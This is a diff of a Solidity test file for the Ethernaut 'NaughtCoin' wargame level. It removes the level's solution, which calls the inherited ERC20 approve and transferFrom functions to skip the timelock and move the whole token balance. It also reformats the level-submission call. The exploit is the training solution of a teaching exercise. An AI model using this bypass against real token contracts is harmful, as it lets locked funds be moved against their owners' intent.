@@ -29,15 +29,13 @@ contract NaughtCoinTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // Use approve and transferFrom which are inherited from ERC20.sol don't have the timelock modifier
-        ethernautNaughtCoin.approve(tx.origin, (1000000 * (10**uint256(18))));
-        ethernautNaughtCoin.transferFrom(tx.origin, address(100), (1000000 * (10**uint256(18))));
-
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
 
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
